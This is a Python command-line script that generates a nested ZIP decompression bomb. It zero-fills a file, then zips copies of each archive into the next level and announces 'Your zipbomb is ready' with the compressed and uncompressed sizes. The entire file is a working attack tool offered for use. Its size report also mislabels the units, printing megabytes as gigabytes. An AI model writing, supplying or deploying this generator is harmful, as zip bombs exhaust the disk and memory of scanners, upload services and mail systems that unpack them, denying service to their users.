import argparse
import os
import shutil
import zipfile


def create_init_file(filename, size):
    with open(filename, "wb") as f:
        f.write(size * b"\0")


def compress_file(input_file, output_zip):
    with zipfile.ZipFile(output_zip, mode="w", allowZip64=True) as zf:
        zf.write(input_file, compress_type=zipfile.ZIP_DEFLATED)


def make_copies_and_compress(input_file, output_zip, n_copies):
    file_base, file_ext = os.path.splitext(input_file)
    with zipfile.ZipFile(output_zip, mode="w", allowZip64=True) as zf:
        for i in range(n_copies):
            temp_file = f"{file_base}-{i}{file_ext}"
            try:
                shutil.copy(input_file, temp_file)
                zf.write(temp_file, compress_type=zipfile.ZIP_DEFLATED)
            finally:
                if os.path.exists(temp_file):
                    os.remove(temp_file)


def main(args):
    size_in_mb = args.size * 1024 * 1024
    init_file = "file.txt"
    next_zip = "0.zip"
    n_levels = args.levels
    n_copies_per_level = args.copies

    try:
        create_init_file(init_file, size_in_mb)
        compress_file(init_file, next_zip)
        os.remove(init_file)

        for i in range(n_levels):
            current_zip = next_zip
            next_zip = f"{i+1}.zip"
            make_copies_and_compress(current_zip, next_zip, n_copies_per_level)
            os.remove(current_zip)
    except Exception as e:
        print(f"Error: {e}")
    finally:
        if os.path.exists(next_zip):
            final_name = "zb.zip"
            os.rename(next_zip, final_name)
            print(f"Your zipbomb is ready: {final_name}")
            print(f"Compressed size: {os.stat(final_name).st_size/1024.0} KB")
            print(f"Uncompressed size: {args.size*n_copies_per_level**n_levels} GB ")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Generate nested ZIP archives with multiple copies per level."
    )
    parser.add_argument(
        "--size",
        type=int,
        required=True,
        help="Size of the initial file in MB. The total decompressed size of the zipbomb will be copies ** levels * size",
    )
    parser.add_argument(
        "--levels",
        type=int,
        default=3,
        help="Number of nested ZIP levels to create (default: 3).",
    )
    parser.add_argument(
        "--copies",
        type=int,
        default=3,
        help="Number of copies to include in each level (default: 3).",
    )
    args = parser.parse_args()
    main(args)
